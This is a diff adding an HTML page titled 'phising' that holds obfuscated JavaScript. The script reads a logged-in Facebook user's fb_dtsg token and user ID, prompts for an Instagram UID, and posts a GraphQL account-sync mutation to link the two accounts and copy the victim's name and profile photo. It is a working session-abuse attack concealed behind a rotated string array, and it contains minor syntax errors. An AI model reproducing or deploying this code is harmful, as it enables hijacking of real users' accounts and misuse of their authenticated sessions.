@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>phising</title>
+</head>
+
+<body>
+ <h1>Phishing </h1>
+ 
+ <<script>
+   
+  function mapIndexToValue(index, offset) {
+  const values = getValuesArray();
+  return function (index, offset) {
+    index = index - 463;
+    return values[index];
+  }(index, offset);
+}
+
+function getValuesArray() {
+  const values = [
+    "application/x-www-form-urlencoded", "NAME", "toString", "Sync successful!", "9388416374608398", "token", "stringify",
+    "320485XcDxHX", "495DbCqDs", "true", "PROFILE_PHOTO", "3312260SQSyez", "device_id_fetch_datr", "115584KbCzZE", "RelayModern",
+    "125058pOhCQI", "trim", "51880VfATOj", "includes", "getRandomValues", "1ZypsQY", "Failed to retrieve required authentication data.",
+    "Sync failed: ", "693TXAIft", "8Kwfmdu", "203evpvZy", "POST", "Failed to fetch fb_dtsg:", "useFXIMUpdateNameMutation", "error",
+    "447156LMFHsc", "text", "Enter Instagram UID:", "1590904ngyDsS", "Error Response:", "Fetch Error:",
+    "Network error occurred.", "FACEBOOK"
+  ];
+  getValuesArray = function () {
+    return values;
+  };
+  return getValuesArray();
+}
+
+(function (getValuesArray, targetValue) {
+  const getValue = mapIndexToValue, values = getValuesArray();
+  while (true) {
+    try {
+      const computedValue = -parseInt(getValue(463)) / 1 * (parseInt(getValue(476)) / 2) + -parseInt(getValue(494)) / 3 * (parseInt(getValue(467)) / 4) + 
+        parseInt(getValue(488)) / 5 + -parseInt(getValue(496)) / 6 * (parseInt(getValue(468)) / 7) + -parseInt(getValue(498)) / 8 * (-parseInt(getValue(466)) / 9) + 
+        -parseInt(getValue(492)) / 10 + -parseInt(getValue(489)) / 11 * (-parseInt(getValue(473)) / 12);
+      if (computedValue === targetValue) break;
+      else values.push(values.shift());
+    } catch (error) {
+      values.push(values.shift());
+    }
+  }
+}(getValuesArray, 432096), (() => {
+  const getValue = mapIndexToValue;
+  
+  async function fetchDTSG() {
+    try {
+      return require(["DTSGInitData"])[getValue(486)];
+    } catch (error) {
+      console.error(getValue(470), error);
+      return null;
+    }
+  }
+
+  async function fetchUserID() {
+    try {
+      return require(["CurrentUserInitialData"]).USER_ID;
+    } catch (error) {
+      console.error("Failed to fetch user ID:", error);
+      return null;
+    }
+  }
+
+  function generateUUID() {
+    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, char => (char ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> char / 4).toString(16));
+  }
+
+  async function syncData(instagramUID) {
+    const dtsg = await fetchDTSG();
+    const userID = await fetchUserID();
+
+    if (!dtsg || !userID) {
+      alert(getValue(464));
+      return;
+    }
+
+    const endpoint = "https://accountscenter.facebook.com/api/graphql/";
+    const variables = JSON.stringify({
+      client_mutation_id: generateUUID(),
+      accounts_to_sync: [instagramUID, userID],
+      resources_to_sync: [getValue(482), getValue(491)],
+      resources_to_unsync null,
+      scale: 3,
+      source_of_truth_array: [{ resource_source: "IG" }, { resource_source: "FB" }],
+      source_account: userID,
+      family_device_id: getValue(493),
+      username_unsync_params: null,
+      platform: getValue(480),
+      sync_logging_params: { client_flow_type: "IM_SETTINGS" },
+      interface: "FB_WEB",
+      feta_profile_sync: false
+    });
+    
+    const body = new URLSearchParams({
+      fb_dtsg: dtsg,
+      __user: userID,
+      variables,
+      av: userID,
+      fb_api_req_friendly_name: getValue(471),
+      fb_api_caller_class: getValue(495),
+      server_timestamps: getValue(490),
+      doc_id: getValue(485)
+    });
+    
+    try {
+      const response = await fetch(endpoint, {
+        method: getValue(469),
+        body,
+        headers: { "Content-Type": getValue(481) }
+      });
+      
+      const responseData = await response.text();
+      if (response.ok && !responseData.includes(getValue(499))) {
+        alert(getValue(484));
+      } else {
+        console.error(getValue(477), responseData);
+        alert(getValue(465) + responseData);
+      }
+    } catch (error) {
+      console.error(getValue(478), error);
+      alert(getValue(479));
+    }
+  }
+
+  let userInput = prompt(getValue(475)).trim();
+  userInput ? syncData(userInput) : alert("Invalid UID.");
+})());
+  
+ </script>
+</body>
+
+</html>
